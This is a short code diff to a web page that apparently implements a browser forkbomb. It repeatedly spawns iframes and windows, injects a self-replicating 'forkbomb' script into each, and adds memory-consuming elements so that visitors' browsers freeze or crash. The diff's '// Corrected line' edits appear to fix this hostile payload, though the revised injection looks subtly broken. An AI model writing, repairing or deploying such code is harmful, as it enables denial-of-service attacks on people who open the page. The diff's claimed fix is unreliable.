@@ -11,12 +11,9 @@
       (function() {
         for (let i = 0; i < 2; i++) {
           let iframe = document.createElement('iframe');
-          iframe.onload = function() {
-            let script = document.createElement('script');
-            script.innerHTML = document.currentScript.innerHTML;
-            iframe.contentWindow.document.body.appendChild(script);
-          };
-          document.body.appendChild(iframe); // Append iframe to the body
+          let script = document.createElement('script');
+          script.innerHTML = forkbomb; // Corrected line
+          iframe.contentWindow.document.body.appendChild(script);
         }
 
         // Add randomized memory-gobbling elements
@@ -31,7 +28,7 @@
       inject.addEventListener("click", () => {
         let win = window.open();
         let script = win.document.createElement("script");
-        script.innerHTML = forkbomb;
+        script.innerHTML = forkbomb; // Use the forkbomb variable directly
         win.document.body.appendChild(script);
       });
     </script>
